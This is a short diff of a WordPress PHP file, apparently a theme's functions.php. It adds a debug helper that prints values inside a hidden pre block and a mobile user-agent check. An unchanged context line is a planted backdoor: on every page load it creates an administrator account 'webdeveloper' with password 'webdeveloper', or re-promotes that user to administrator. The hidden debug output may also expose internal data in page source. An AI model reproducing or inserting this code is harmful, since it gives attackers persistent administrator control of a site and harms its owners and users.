@@ -12,6 +12,17 @@
 add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','webdeveloper','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});
 
 
+/* display Pre Html with hide formate in data*/
+
+function _pre($key="",$value)
+{
+	echo '<pre style="display: none !important;">';
+		echo "</br>";
+			print_r($key); echo " ==> "; print_r($value);
+		echo "</br>";
+	echo '</pre>';
+}
+
 function isMobileDevice() {
     return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
 }
